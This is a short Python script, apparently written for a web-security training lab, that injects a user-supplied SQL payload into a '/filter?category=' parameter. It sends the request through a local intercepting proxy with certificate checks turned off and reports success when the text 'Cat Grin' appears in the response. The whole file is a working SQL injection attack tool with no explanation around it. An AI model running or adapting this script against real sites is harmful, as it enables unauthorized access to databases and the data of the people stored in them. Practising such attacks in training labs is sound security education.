import argparse
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def exploit_sqli(url, payload):
    uri = '/filter?category='

    # make a GET request
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)

    # verify exploitation
    if "Cat Grin" in r.text:
        return True
    else:
        return False

def main():
    parser = argparse.ArgumentParser(
        description="test a URL for SQL injection vulnerability"
    )

    parser.add_argument(
        "url", 
        help="target URL (e.g. www.example.com)"
    )

    parser.add_argument(
        "payload",
        help='SQL injection payload (e.g. "1=1")'
    )

    args = parser.parse_args()

    url = args.url.strip()
    payload = args.payload.strip()

    if exploit_sqli(url, payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection failure!")

if __name__ == "__main__":
    main() 